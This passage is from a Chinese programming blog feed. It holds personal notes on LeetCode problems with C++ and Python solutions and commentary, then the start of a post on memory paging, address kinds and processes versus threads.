tmp.top()==&#39;[&#39;)                        tmp.pop();                    else                        return false;                    break;                }        }        if(tmp.empty())            return true;        else            return false;    }};</code></pre><h3 id="改进-10"><a href="#改进-10" class="headerlink" title="改进"></a>改进</h3><p>学习了大佬们的代码，在switch语句方面还可以优化</p><pre><code class="C++">class Solution {public:    bool isValid(string s) {        if(s.size()%2!=0) return false;        unordered_map&lt;char,int&gt; x={{'{',1},{'(',2},{'[',3},{'}',4},{')',5},{']',6}};        stack&lt;char&gt; tmp;        for(int i=0;i&lt;s.size();i++) {            if(x[s[i]]&lt;=3) tmp.push(s[i]);            else if(!tmp.empty() &amp;&amp; x[tmp.top()]==x[s[i]]-3)                tmp.pop();            else                return false;        }        return tmp.empty();    }};</code></pre><h2 id="118-杨辉三角"><a href="#118-杨辉三角" class="headerlink" title="118. 杨辉三角"></a><a href="https://leetcode-cn.com/problems/pascals-triangle/" target="_blank" rel="noopener">118. 杨辉三角</a></h2><h3 id="个人解答-19"><a href="#个人解答-19" class="headerlink" title="个人解答"></a>个人解答</h3><p>比较简单，贴一个递归版本</p><pre><code class="C++">class Solution {public:    vector&lt;vector&lt;int&gt;&gt; generate(int numRows) {        if(numRows==0) return {};        if(numRows==1) return {{1}};        vector&lt;vector&lt;int&gt;&gt; result;        result=generate(numRows-1);        vector&lt;int&gt; tmp={1};        for(int pos=1;pos&lt;numRows-1;pos++)            tmp.push_back(result[numRows-2][pos-1]+result[numRows-2][pos]);           tmp.push_back(1);        result.push_back(tmp);        return result;    }};</code></pre><h2 id="268-缺失数字"><a href="#268-缺失数字" class="headerlink" title="268. 缺失数字"></a><a href="https://leetcode-cn.com/problems/missing-number/" target="_blank" rel="noopener">268. 缺失数字</a></h2><p>一道简单的题目，但是第一次的写法实在是蠢到了极点</p><h3 id="个人解答-20"><a href="#个人解答-20" class="headerlink" title="个人解答"></a>个人解答</h3><pre><code class="C++">class Solution {public:    int missingNumber(vector&lt;int&gt;&amp; nums) {        int result=0;        for(int tmp:nums) {            if(tmp%2==0)                result+=tmp;            else                result-=tmp;        }        if(nums.size()%2==0) {            result=(nums.size()+1)/2-result;        }        else {            result=-(nums.size()+1)/2-result;        }        if(result&lt;0)            result=-result;        return result;    }};</code></pre><p>在想什么偶数加，奇数减的操作。。。。。。。。</p><h3 id="改进-11"><a href="#改进-11" class="headerlink" title="改进"></a>改进</h3><p>改进的办法也很多，利用高斯公示先求出和，在减去给出的数组的和；或者先求出完整数组的各个数的异或值，在不断的与给出的数值进行异或。办法是真的多，但是为啥你就想到了什么偶数加奇数减的操作</p><h2 id="14-最长公共前缀"><a href="#14-最长公共前缀" class="headerlink" title="14. 最长公共前缀"></a><a href="https://leetcode-cn.com/problems/longest-common-prefix/" target="_blank" rel="noopener">14. 最长公共前缀</a></h2><p>找出各个字符串的相同的最长前缀</p><h3 id="个人解答-21"><a href="#个人解答-21" class="headerlink" title="个人解答"></a>个人解答</h3><p>比较暴力，直接扫描</p><pre><code class="C++">class Solution {public:    string longestCommonPrefix(vector&lt;string&gt;&amp; strs) {        if(strs.size()==0) return &quot;&quot;;        if(strs.size()==1) return strs[0];        int length=0;        while(1){            for(int i=0;i&lt;strs.size()-1;i++) {                if(length == strs[i].size() || length == strs[i+1].size() || strs[i+1][length]!=strs[i][length]) {    //优先检查size大小，所以不存在溢出                    return strs[0].substr(0,length);                }            }            length++;        }        return &quot;&quot;;    }};</code></pre><p>这种想法很容易让人想到，但是在写法上，使用了<code>while(1)</code>,很容易漏考虑情况造成死循环，如果说要改进的话，可以将strs[0]作为最外层的循环，以它为基础进行比较</p><h3 id="网络解答"><a href="#网络解答" class="headerlink" title="网络解答"></a>网络解答</h3><p>大佬们的办法真的多，贴一种以strs[0]作为比较对象，一次一次剔除删减的办法</p><pre><code class="JAVA">public String longestCommonPrefix(String[] strs) {   if (strs.length == 0) return &quot;&quot;;   String prefix = strs[0];   for (int i = 1; i &lt; strs.length; i++)       while (strs[i].indexOf(prefix) != 0) {           prefix = prefix.substring(0, prefix.length() - 1);           if (prefix.isEmpty()) return &quot;&quot;;       }           return prefix;}</code></pre><p>模仿写一个c++版本的</p><pre><code class="C++">class Solution {public:class Solution {public:    string longestCommonPrefix(vector&lt;string&gt;&amp; strs) {        if(strs.size()==0) return &quot;&quot;;        string tmp=strs[0];        for(int i=1;i&lt;strs.size();i++) {            while(strs[i].find(tmp)!=0) {            //find查找失败时，是std::string:npos,即-1                tmp=tmp.substr(0,tmp.length()-1);    //在开头匹配不到，则删减tmp            }        }        return tmp;    }};    string longestCommonPrefix(vector&lt;string&gt;&amp; strs) {        if(strs.size()==0) return &quot;&quot;;        string tmp=strs[0];        for(int i=1;i&lt;strs.size();i++) {            while(strs[i].find(tmp)!=0) {                  tmp=tmp.substr(0,tmp.length()-1);    //在开头匹配不到，则删减tmp            }        }        return tmp;    }};</code></pre><h2 id="387-字符串中的第一个唯一字符"><a href="#387-字符串中的第一个唯一字符" class="headerlink" title="387. 字符串中的第一个唯一字符"></a><a href="https://leetcode-cn.com/problems/first-unique-character-in-a-string/" target="_blank" rel="noopener">387. 字符串中的第一个唯一字符</a></h2><p>题目比较简单，但是也有需要注意的地方</p><h3 id="个人解答-22"><a href="#个人解答-22" class="headerlink" title="个人解答"></a>个人解答</h3><pre><code class="C++">class Solution {public:    int firstUniqChar(string s) {        int tmp[26]={0};           for(int i=0;i&lt;s.size();i++) {            tmp[s[i]-&#39;a&#39;]++;        }        for(int i=0;i&lt;s.size();i++) {            if(tmp[s[i]-&#39;a&#39;]==1) {                return i;            }        }        return -1;    }};</code></pre><p>两次遍历。第一次在写代码的时候使用的是<code>unordered_map</code>，简单的理解<code>unordered_map</code>的遍历顺序就是插入顺序，但是实际情况不是这样的，<code>unordered_map</code>与<code>map</code>都无法保证遍历顺序是插入顺序<br><a href="https://www.coder.work/article/1208488" target="_blank" rel="noopener">参考链接</a></p><h2 id="48-旋转图像"><a href="#48-旋转图像" class="headerlink" title="48. 旋转图像"></a><a href="https://leetcode-cn.com/problems/rotate-image/" target="_blank" rel="noopener">48. 旋转图像</a></h2><p>题目要求顺时针旋转90°</p><h3 id="个人解答-23"><a href="#个人解答-23" class="headerlink" title="个人解答"></a>个人解答</h3><p>找到规律，先对角翻转“/”，在横向数据上下颠倒就是</p><pre><code class="C++">class Solution {public:    void rotate(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) {        int length=matrix.size();        for(int i=0;i&lt;length;i++) {            for(int j=0;j&lt;length-i-1;j++) {   //沿对角线&quot;/&quot;翻转                matrix[i][j]+=matrix[length-1-j][length-1-i];                matrix[length-1-j][length-1-i]=matrix[i][j]-matrix[length-1-j][length-1-i];                matrix[i][j]=matrix[i][j]-matrix[length-1-j][length-1-i];            }        }        reverse(matrix.begin(),matrix.end());  //按行逆序    }};</code></pre><p>大佬们还采用了直接移动的办法，依据矩阵大小可以很快的计算出某个位置移动之后位置，如此，由外到内或者从内到外一圈一圈的完成移动，ennn好是好，但是编程过程中位置的计算不太方便，而且在leetcode中调试不便，此处就不在尝试了</p><h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">1. 两数之和</a></h2><h3 id="个人解答-24"><a href="#个人解答-24" class="headerlink" title="个人解答"></a>个人解答</h3><p>最暴力的方法就是两层for循环嘛</p><pre><code class="C++">class Solution {public:    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) {        unordered_map&lt;int,int&gt; s;        vector&lt;int&gt; result;        for(int i=0;i&lt;nums.size();i++) {            if(s[nums[i]]!=0) {                result.push_back(s[nums[i]]-1);                                result.push_back(i);                break;            }            s[target - nums[i]]= i+1; //区别 下标0 与默认值0        }        return result;    }};</code></pre><h3 id="优解"><a href="#优解" class="headerlink" title="优解"></a>优解</h3><p>与大佬们的想法是一样的，但是代码的美观程度与可读性还是没法比</p><pre><code class="C++">class Solution {public:    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) {        unordered_map&lt;int, int&gt; hash;        for(int i = 0; i &lt; nums.size(); i++){            if(hash.count(target - nums[i])) return {hash[target - nums[i]], i};            hash[nums[i]] = i;        }        return {-1, -1};    }};</code></pre><p>说明一下，实验发现，“unordered_map”的count方法效率要比find方法高出不少；学习一波返回值<code>vector&lt;int&gt;</code>的写法</p><h2 id="66-加一"><a href="#66-加一" class="headerlink" title="66. 加一"></a><a href="https://leetcode-cn.com/problems/plus-one/" target="_blank" rel="noopener">66. 加一</a></h2><h3 id="个人解答-25"><a href="#个人解答-25" class="headerlink" title="个人解答"></a>个人解答</h3><p>想法还是比较简答的，最容易想到的就是保存为整数，然后加1再分离保存。但是这么简单的题要求高一点</p><pre><code class="C++">class Solution {public:    vector&lt;int&gt; plusOne(vector&lt;int&gt;&amp; digits) {        int pos=digits.size()-1;        while(pos&gt;=0 &amp;&amp; ++digits[pos]==10) {  //每一位加1，模拟进位            digits[pos]=0;            pos--;        }        if(digits[0]==0) {               //第一个数为0则说明产生了进位，最开头添加1            digits.insert(digits.begin(),1);            digits[1]=0;        }        return digits;    }};</code></pre><p>网上的想法大同小异，不多说了</p><h2 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode-cn.com/problems/move-zeroes/" target="_blank" rel="noopener">283. 移动零</a></h2><h3 id="个人解答-26"><a href="#个人解答-26" class="headerlink" title="个人解答"></a>个人解答</h3><p>想法比较简单，使用双指针来实现的</p><pre><code class="C++">class Solution {public:    void moveZeroes(vector&lt;int&gt;&amp; nums) {        int prv=0,curr=0;        while(curr!=nums.size()) {            if(nums[curr]!=0) {                nums[prv]=nums[curr];                prv++;            }            curr++;        }        while(prv!=nums.size()) {            nums[prv]=0;            prv++;        }    }};</code></pre><h3 id="网上优解-2"><a href="#网上优解-2" class="headerlink" title="网上优解"></a>网上优解</h3><p>上面的解答使用到了二次遍历，大佬们还给出了一次遍历的方法</p><pre><code class="C++">class Solution {public:    void moveZeroes(vector&lt;int&gt;&amp; nums) {        int i=0;        for(int pos=0;pos!=nums.size();pos++) {            if(nums[pos]!=0) {                int tmp=nums[i];        //当pos与i相等时，无法使用相加减交换的办法                nums[i++]=nums[pos];                nums[pos]=tmp;            }        }    }};</code></pre><p>说这个一次遍历有些难以理解，看上去好像也是双指针的办法，但是如果理解为i为非0的个数，就好多了；上面的首次解答即2次完整的遍历</p><h2 id="860-柠檬水找零"><a href="#860-柠檬水找零" class="headerlink" title="860. 柠檬水找零"></a><a href="https://leetcode-cn.com/problems/lemonade-change/" target="_blank" rel="noopener">860. 柠檬水找零</a></h2><p>题目比较简单，就是单纯的模拟找零钱的过程，注意一下找15时优先10+5即可</p><pre><code class="C++">class Solution {public:    bool lemonadeChange(vector&lt;int&gt;&amp; bills) {        int five=0,ten=0,tw=0;        for(int i=0;i&lt;bills.size();i++)        {            if(bills[i]==5) {                five++;            }            else if(bills[i]==10) {                if(five==0)                    return false;                else {                    five--;                    ten++;                }            }            else {                if(five&gt;=1 &amp;&amp; ten&gt;=1) {                    five--;                    ten--;                }                else if(five&gt;=3)                    five-=3;                else                    return false;            }        }        return true;    }}</code></pre><h2 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202. 快乐数"></a><a href="https://leetcode-cn.com/problems/happy-number/" target="_blank" rel="noopener">202. 快乐数</a></h2><blockquote><p>输入：19<br>输出：true<br>解释：<br>12 + 92 = 82<br>82 + 22 = 68<br>62 + 82 = 100<br>12 + 02 + 02 = 1<br>能够等于1则为快乐数</p></blockquote><h3 id="个人首解-1"><a href="#个人首解-1" class="headerlink" title="个人首解"></a>个人首解</h3><p>主要思想就是循环计算下一个，判断是否为1，当出现循环的时候直接返回 False</p><pre><code class="C++">class Solution {public:    bool isHappy(int n) {        unordered_map&lt;int,int&gt; tmp;        while(n!=1)        {            tmp[n]++;            string s=to_string(n);            n=0;            for(int i=0;i&lt;s.size();i++)                n+=(s[i]-&#39;0&#39;)*(s[i]-&#39;0&#39;);            if(tmp.count(n))                return false;        }        return true;    }};</code></pre><h3 id="网上优解-3"><a href="#网上优解-3" class="headerlink" title="网上优解"></a>网上优解</h3><p>这里主要学习一下在判断虚幻的时候，使用快慢指针的做法，快指针在前，每次向前两步，慢指针每次向前一步，当出现循环时快指针一定可以追上慢指针<br><a href="https://leetcode-cn.com/problems/happy-number/solution/kuai-le-shu-by-leetcode-solution/" target="_blank" rel="noopener">官方解答</a></p><h3 id="个人改进-2"><a href="#个人改进-2" class="headerlink" title="个人改进"></a>个人改进</h3><p>对循环判断进行改进</p><pre><code class="C++">class Solution {public:    int calc(int n)    {        string tmp=to_string(n);        int result=0;        for(int i=0;i&lt;tmp.size();i++)        {            result+=(tmp[i]-&#39;0&#39;)*(tmp[i]-&#39;0&#39;);        }        return result;    }    bool isHappy(int n) {        unordered_map&lt;int,int&gt; tmp;        int fast=n,slow=n;        do        {            fast=calc(fast);            fast=calc(fast);            slow=calc(slow);        }while(slow!=fast);        if(slow==1)            return true;        else            return false;    }};</code></pre><p>其实具体的做法听多的，也可以保存计算值避免重复计算  </p><h2 id="1351-统计有序矩阵中的负数"><a href="#1351-统计有序矩阵中的负数" class="headerlink" title="1351. 统计有序矩阵中的负数"></a><a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/" target="_blank" rel="noopener">1351. 统计有序矩阵中的负数</a></h2><h3 id="个人解答-27"><a href="#个人解答-27" class="headerlink" title="个人解答"></a>个人解答</h3><p>做法挺多的，最简单的就是直接便利访问，但是没有利用到有序这个条件<br>于是乎  </p><pre><code class="Python">class Solution:    def countNegatives(self, grid: List[List[int]]) -&gt; int:        result=0        transverselyin=len(grid[0])-1        for i in range(len(grid)):            left=0            right=transverselyin            while left &lt;= right:                //最左边的数是负数                if grid[i][left]&lt;0 :                       result+=(transverselyin-left+1)*(len(grid)-i)                    transverselyin=left-1                    break                else:                    //最右边的数非负                    if grid[i][right]&gt;=0:                        break                    else:                        tmp=(right-left)//2+left                        if grid[i][tmp]&lt;0:                            right=tmp                        else:                            left=tmp+1        return result</code></pre><p>利用矩阵中上下有序，利用上一行的结果缩小下一行的查找范围（类似于大佬说的下梯子），查找的时候利用二分法查找第一个出现的负数，因为可能初现一行全负或全正的情况，所以用了过多的if判断语句。</p><h2 id="1436-旅行终点站"><a href="#1436-旅行终点站" class="headerlink" title="1436. 旅行终点站"></a><a href="https://leetcode-cn.com/problems/destination-city/" target="_blank" rel="noopener">1436. 旅行终点站</a></h2><p>输入每次旅行的起点与终点，计算整个路程的终点  </p><blockquote><p>输入：paths = [[“London”,”New York”],[“New York”,”Lima”],[“Lima”,”Sao Paulo”]]<br>输出：”Sao Paulo”<br>解释：从 “London” 出发，最后抵达终点站 “Sao Paulo” 。本次旅行的路线是 “London” -&gt; “New York” -&gt; “Lima” -&gt; “Sao Paulo” 。</p></blockquote><h3 id="个人首解-2"><a href="#个人首解-2" class="headerlink" title="个人首解"></a>个人首解</h3><p>主要想法就是通过模仿Python的字典，一个一个往下查询。因为只需要查找终点，所以从第一个开始查询就行  </p><pre><code class="C++">class Solution {public:    string destCity(vector&lt;vector&lt;string&gt;&gt;&amp; paths) {        string result = paths[0][1];        unordered_map&lt;string,string&gt; tmp;        for(auto i = paths.begin();i!=paths.end();i++)        {            tmp[(*i)[0]]=(*i)[1];        }        while(tmp.find(result)!=tmp.end())        {            result=tmp[result];        }        return result;    }};//Python代码类似， 但还是注意 Python3中字典不在提供has_key方法</code></pre><h3 id="网上优解-4"><a href="#网上优解-4" class="headerlink" title="网上优解"></a>网上优解</h3><p>思路就是只有终点没有在 起点中出现过，于是乎</p><pre><code class="C++">class Solution {public:    string destCity(vector&lt;vector&lt;string&gt;&gt;&amp; paths) {        unordered_map&lt;string,int&gt;  helper;        for(auto  p:paths){            helper[p[0]]+=1;            helper[p[1]]+=0;        }        for(auto  h:helper){            if(h.second==0){                return h.first;            }        }        return &quot;&quot;;    }};</code></pre><pre><code class="Python">class Solution:    def destCity(self, paths: List[List[str]]) -&gt; str:        n = len(paths)        begin = set()  # 存储所有起点        end = set()  # 存储所有终点        for i in range(n):            begin.add(paths[i][0])            end.add(paths[i][1])        where = list(end - begin)  # 集合的差集运算        return where[0]</code></pre><p>Python的写法比较多，但是思想基本一致，说明一下这里的集合差<code>begin - end</code>将返回begin中存在，但是end中不存在的内容，这样的话就可以查找起点了</p><h3 id="个人改进-3"><a href="#个人改进-3" class="headerlink" title="个人改进"></a>个人改进</h3><p>上面的C++代码做了起点与终点区分，我们尝试改动一点点，就可以看出整个路线的起点，经过，终点</p><pre><code class="C++">class Solution {public:    string destCity(vector&lt;vector&lt;string&gt;&gt;&amp; paths) {        unordered_map&lt;string,int&gt; tmp;        for(auto i : paths)        {            tmp[i[0]]+=1;            tmp[i[1]]-=1;        }        for(auto i : tmp)        {            if(i.second==-1)                return i.first;        }        return &quot;&quot;;    }};</code></pre><h2 id="1431-拥有最多糖果的孩子"><a href="#1431-拥有最多糖果的孩子" class="headerlink" title="1431. 拥有最多糖果的孩子"></a><a href="https://leetcode-cn.com/problems/kids-with-the-greatest-number-of-candies/" target="_blank" rel="noopener">1431. 拥有最多糖果的孩子</a></h2><p>给孩子一定的糖果，记录返回哪些孩子得到这些糖果之后成为数量最多</p><h3 id="个人首解-3"><a href="#个人首解-3" class="headerlink" title="个人首解"></a>个人首解</h3><pre><code class="python">class Solution:    def kidsWithCandies(self, candies: List[int], extraCandies: int) -&gt; List[bool]:        result=[]        max=0        for i in candies:            if i&gt;max:                max=i               for i in candies:            if i+extraCandies&gt;=max:                result.append(True)            else:                result.append(False)        return result</code></pre><p>C++的思想与python一样，都是通过先寻找最大值然后在比较</p><h3 id="网上优解-5"><a href="#网上优解-5" class="headerlink" title="网上优解"></a>网上优解</h3><pre><code class="python">class Solution:    def kidsWithCandies(self, candies: List[int], extraCandies: int) -&gt; List[bool]:        maxc = max(candies)        res = []        for i in candies:                res.append(i+extraCandies &gt;= maxc)        return res</code></pre><p>思路是一样的，使用了max函数寻找的最大值，但是在写法上要比自己的简洁</p><h3 id="个人改进-4"><a href="#个人改进-4" class="headerlink" title="个人改进"></a>个人改进</h3><pre><code class="python">class Solution:    def kidsWithCandies(self, candies: List[int], extraCandies: int) -&gt; List[bool]:        return [i + extraCandies &gt;= max(candies) for i in candies]</code></pre><h2 id="1389-按既定顺序创建目标数组"><a href="#1389-按既定顺序创建目标数组" class="headerlink" title="1389. 按既定顺序创建目标数组"></a><a href="https://leetcode-cn.com/problems/create-target-array-in-the-given-order/" target="_blank" rel="noopener">1389. 按既定顺序创建目标数组</a></h2><p>一个元素数组，一个下标数组（下标可重复，按先后插入）  </p><h3 id="个人首解-4"><a href="#个人首解-4" class="headerlink" title="个人首解"></a>个人首解</h3><pre><code class="python">class Solution:    def createTargetArray(self, nums: List[int], index: List[int]) -&gt; List[int]:        result=[]        for i in range(len(nums)):            result.insert(index[i],nums[i])        return result</code></pre><pre><code class="C++">class Solution {public:    vector&lt;int&gt; createTargetArray(vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; index) {        vector&lt;int&gt;result;        for(int i =0;i&lt;nums.size();i++)        {            if(index[i]&gt;result.size())                result.insert(result.end(),nums[i]);            else                result.insert(result.begin()+index[i],nums[i]);        }        return result;    }};</code></pre><h3 id="网上优解-6"><a href="#网上优解-6" class="headerlink" title="网上优解"></a>网上优解</h3><p>没有见到Python的一句话写法，但是发现c++ insert的时候，没必要考虑插入的位置大于现有的数组长度</p><h3 id="改进-12"><a href="#改进-12" class="headerlink" title="改进"></a>改进</h3><pre><code class="c++">class Solution {public:    vector&lt;int&gt; createTargetArray(vector&lt;int&gt;&amp; nums, vector&lt;int&gt;&amp; index) {        vector&lt;int&gt;result;        for(int i =0;i&lt;nums.size();i++)            result.insert(result.begin()+index[i],nums[i]);        return result;    }};</code></pre><h2 id="面试题64"><a href="#面试题64" class="headerlink" title="面试题64"></a><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/" target="_blank" rel="noopener">面试题64</a></h2><p>求1+2+……+n，不可使用if、while、switch、for、else以及条件判断语句（A？B：C）  </p><h3 id="首次解答"><a href="#首次解答" class="headerlink" title="首次解答"></a>首次解答</h3><pre><code class="python">class Solution:    def sumNums(self, n: int) -&gt; int:        return sum(range(1,n+1))</code></pre><p>没想到C++的写法，参考他人答案</p><h3 id="他人优解"><a href="#他人优解" class="headerlink" title="他人优解"></a>他人优解</h3><pre><code class="c++">class Solution {public:    int sumNums(int n) {        n &amp;&amp; (n += sumNums(n-1));        return n;    }};</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用到了 A&amp;&amp;B：  </p><ol><li><p>当A为True时，计算并返回B的bool值</p></li><li><p>当A为False时，直接返回False<br>与以往的迭代不同，它没有写在return语句中</p><h2 id="219存在重复元素Ⅱ"><a href="#219存在重复元素Ⅱ" class="headerlink" title="219存在重复元素Ⅱ"></a><a href="https://leetcode-cn.com/problems/contains-duplicate-ii/" target="_blank" rel="noopener">219存在重复元素Ⅱ</a></h2><p>判断某元素相邻的范围内是否存在相同元素  </p><h3 id="首次解答-1"><a href="#首次解答-1" class="headerlink" title="首次解答"></a>首次解答</h3><pre><code class="C++">class Solution {public: bool containsNearbyDuplicate(vector&lt;int&gt;&amp; nums, int k) {     unordered_map &lt;int,vector&lt;int&gt;&gt;hash;     for(int i=0;i&lt;nums.size();i++)     {         hash[nums[i]].push_back(i);     }     for(auto i=hash.begin();i!=hash.end();i++)     {         if(i-&gt;second.size()!=1)         {             for(auto j =0;j&lt;i-&gt;second.size()-1;j++)                 if ((i-&gt;second)[j+1]-(i-&gt;second)[j]&lt;=k)                     return true;         }     }     return false; }   };</code></pre><p>初期思路是将相同的元素的下标分开排列，再进行比较，但是后面一想，访问输入元素时，下标是不断增加的，判断相邻下标即可，即只保存最新的下标即可</p></li></ol><h3 id="优化改进"><a href="#优化改进" class="headerlink" title="优化改进"></a>优化改进</h3><pre><code class="C++">class Solution {public:    bool containsNearbyDuplicate(vector&lt;int&gt;&amp; nums, int k) {        unordered_map &lt;int,int&gt;hash;        for(int i=0;i&lt;nums.size();i++)        {            if(hash[nums[i]]!=0 &amp;&amp; ((i+1)-hash[nums[i]])&lt;=k)                return true;            hash[nums[i]]=i+1;   //抬高下标，与初始值0做区分        }        return false;    }   };</code></pre><hr><h2 id="1295统计位数为偶数的数字"><a href="#1295统计位数为偶数的数字" class="headerlink" title="1295统计位数为偶数的数字"></a><a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/" target="_blank" rel="noopener">1295统计位数为偶数的数字</a></h2><h3 id="首次解答-2"><a href="#首次解答-2" class="headerlink" title="首次解答"></a>首次解答</h3><pre><code class="Python">class Solution:    def findNumbers(self, nums: List[int]) -&gt; int:        return(sum(len(str(i))%2==0 for i in nums ))</code></pre><pre><code class="C++">class Solution {public:    int findNumbers(vector&lt;int&gt;&amp; nums) {        int sum=0;        for(auto i=nums.begin();i!=nums.end();i++)        {            if(*i&gt;=10 &amp;&amp; *i&lt;=99 || *i&gt;=1000 &amp;&amp; *i&lt;=9999 || *i==100000 )                sum++;        }        return sum;    }};</code></pre><p>我写的答案，做法比较简单，时间效率也比较高，但是C++有字符串相关的方法，记录一下</p><h3 id="网上优解-7"><a href="#网上优解-7" class="headerlink" title="网上优解"></a>网上优解</h3><pre><code class="C++">//转为字符串，求长度比较class Solution1 {public:    int findNumbers(vector&lt;int&gt;&amp; nums) {        int ans = 0;        for (int num: nums) {            if (to_string(num).size() % 2 == 0) {                ++ans;            }        }        return ans;    }};//利用数学方法求解class Solution2 {public:    int findNumbers(vector&lt;int&gt;&amp; nums) {        int ans = 0;        for (int num: nums) {            if ((int)(log10(num) + 1) % 2 == 0) {                ++ans;            }        }        return ans;    }};</code></pre><hr><h2 id="1313解压缩编码列表"><a href="#1313解压缩编码列表" class="headerlink" title="1313解压缩编码列表"></a><a href="https://leetcode-cn.com/problems/decompress-run-length-encoded-list/" target="_blank" rel="noopener">1313解压缩编码列表</a></h2><blockquote><p>数组中，每两个元素为一组，第一个元素表示后一个元素出现的次数，对输入的数组进行解压缩<br>输入：nums = [1,2,3,4]<br>输出：[2,4,4,4]</p></blockquote><h3 id="首次解答-3"><a href="#首次解答-3" class="headerlink" title="首次解答"></a>首次解答</h3><pre><code class="C++">class Solution {public:    vector&lt;int&gt; decompressRLElist(vector&lt;int&gt;&amp; nums) {        vector&lt;int&gt; result;        for(int i=0;i&lt;=nums.size()-2;i+=2)        {            while(nums[i])            {                result.push_back(nums[i+1]);                nums[i]--;            }        }        return result;    }};</code></pre><pre><code class="Python">class Solution:    def decompressRLElist(self, nums: List[int]) -&gt; List[int]:        result=[]        for i in range(0,len(nums),2):            for j in range(nums[i]):                result.append(nums[i+1])        return  result;</code></pre><p>主要是Python没有想到一句话的写法</p><h3 id="网上优解-8"><a href="#网上优解-8" class="headerlink" title="网上优解"></a>网上优解</h3><pre><code class="Python">class Solution:    def decompressRLElist(self, nums: List[int]) -&gt; List[int]:        return [nums[i] for i in range(len(nums)) for j in range(nums[i-1]) if i % 2 == 1]class Solution:    def decompressRLElist(self, nums: List[int]) -&gt; List[int]:        return [i for i,j in zip(nums[1::2],nums[::2]) for _ in range(j)]class Solution:    def decompressRLElist(self, nums: List[int]) -&gt; List[int]:        return sum(([b] * a for a, b in zip(nums[::2], nums[1::2])), [])</code></pre><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>Python的一句话第一种想法没有想到，可能是因为从来没有在一句话中使用过两个for，第二种写法主要是利用zip进行了迭代访问，第三种方法与第二种不同的地方在于没有循环的打印，而是先通过zip分组，相乘解压，然后通过sum来合并各个组的解压结果</p><hr><hr>]]></content>
      
      
      <categories>
          
          <category> 基础编程 </category>
          
          <category> 编程训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C\C++ </tag>
            
            <tag> Code </tag>
            
            <tag> Python </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养(1)--静态链接</title>
      <link href="/2020/04/27/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-1/"/>
      <url>/2020/04/27/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-温故而知新"><a href="#1-温故而知新" class="headerlink" title="1.温故而知新"></a>1.温故而知新</h1><blockquote><p><code>计算机科学领域的任何一个问题都可以通过增加一个间接的中间层来解决</code><br><code>Any Problem in Computer science can be solved by another layer of indirection.</code></p></blockquote><h2 id="分段与分页"><a href="#分段与分页" class="headerlink" title="分段与分页"></a>分段与分页</h2><h3 id="分段与分页-1"><a href="#分段与分页-1" class="headerlink" title="分段与分页"></a>分段与分页</h3><p>最初始的内存分配方案（直接线性的分配物理内存）主要存在地址空间不隔离、内存使用效率低、程序的运行地址不确定三大问题，提出的‘中间层’解决方案就是虚拟地址<br>分段：<br>将用户程序地址空间划分为若干大小不等的段，每个段可以定义一组相对完整的逻辑信息。存储分配时，以段为单位，段与段在内存中可以不相邻，即离散分配<br>分页：<br>为了提高内存使用率，利用程序的局部性原理，把地址空间认为的划分为固定大小的页，对应的，物理内存也划分为与页大小相等的许多物理块。这个页、块对用户是透明的，看不见的。<br>页错误，是当虚拟内存的页找不到对应的物理内存块时产生的异常。</p><h3 id="物理地址、逻辑地址、虚拟地址"><a href="#物理地址、逻辑地址、虚拟地址" class="headerlink" title="物理地址、逻辑地址、虚拟地址"></a>物理地址、逻辑地址、虚拟地址</h3><p>物理地址：内存芯片级的单元寻址，由硬件电路控制其具体含义，用来访问物理内存<br>逻辑地址：程序在执行指令，访问数据的时候通过逻辑地址（相对地址）进行访问操作<br>虚拟地址：又称线性地址，是逻辑地址与物理地址转换的中间层。用来访问虚拟内存空间  </p><p>虚拟地址=程序基地址＋逻辑地址（相对地址）  </p><div align=center><img src="./1/物理地址与虚拟地址转换.png" alt="物理地址与虚拟地址转换"   /></div>随着物理内存的不断增加，单纯的再使用一个页表的话会使页面更加庞大，维护难度上升，查找难度增加，Linux中已经使用了4级页表。  <div align=center><img src="./1/Linux中的四级页表转换.png" alt="Linux中的四级页表转换"   /></div>CR3寄存器中保存着进程的PGD地址（Page Global Directory），每个进程都有自己的页目录地址，进程切换的时候由操作系统负责将页目录地址装入到CR3中，之后的地址翻译过程由MMU（Memory Management Unit）硬件完成  <h2 id="众人拾柴火焰高"><a href="#众人拾柴火焰高" class="headerlink" title="众人拾柴火焰高"></a>众人拾柴火焰高</h2><h3 id="进程、线程、协程"><a href="#进程、线程、协程" class="headerlink" title="进程、线程、协程"></a>进程、线程、协程</h3><p>进程： 操作系统进行调度与资源分配的基本单元<br>线程： 轻量级进程，CPU进行调度和分派的基本单位，基本上不拥有资源，共享一个进程的所有资源<br>协程： 轻量级线程，协程的调度由用户控制，所以可以看做是原子操作。Python使用yield关键字的生成器函数就是一种协程的应用  </p><div align=center><img src="./1/进程与线程关系图.png" alt="进程与线程关系图"   /></div><table><thead><tr><th align="left">线程私有</th><th align="left">线程之间共享（进程所有）</th></tr></thead><tbody><tr><td align="left">● 局部变量<br>● 函数的参数<br>● 线程局部存储TLS数据（Thread Local Storage）</td><td align="left">● 全局变量<br>● 堆上的数据<br>● 函数里的静态变量<br>● 程序代码<br>● 打开的文件</td></tr></tbody></table><h3 id="程序状态"><a href="#程序状态" class="headerlink" title="程序状态"></a>程序状态</h3><ol><li>新建<br> 